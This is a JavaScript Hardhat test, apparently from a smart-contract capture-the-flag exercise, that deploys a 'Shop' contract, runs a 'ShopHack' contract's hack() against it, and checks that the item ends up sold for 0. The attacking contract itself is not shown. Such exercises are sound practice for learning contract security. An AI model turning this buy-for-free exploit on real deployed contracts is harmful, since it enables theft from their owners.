const { expect } = require("chai");

describe("Shop", function () {
  it("Should buy for 0", async function () {

    const [deployer, hacker] = await ethers.getSigners();

    const Shop = await ethers.getContractFactory("Shop", deployer);
    this.shop = await Shop.deploy();

    console.log(`Shop contract deployed to: ${this.shop.address}`);

    let price = await this.shop.price()
    let isSold = await this.shop.isSold()

    console.log(`Shop price: ${price}`)
    console.log(`Shop isSold: ${isSold}`)

    // check inital values are price = 100 and isSold = false
    expect(price).to.equal(100);
    expect(isSold).to.equal(false);

    const ShopHack = await ethers.getContractFactory("ShopHack", hacker);
    this.shopHack = await ShopHack.deploy();

    console.log(`\nShopHack contract deployed to: ${this.shopHack.address}`);

    await this.shopHack.hack(this.shop.address);

    price = await this.shop.price()
    isSold = await this.shop.isSold()

    console.log(`Shop price: ${price}`)
    console.log(`Shop isSold: ${isSold}`)

    // check inital values are price = 0 and isSold = true
    expect(price).to.equal(0);
    expect(isSold).to.equal(true);
  });
});
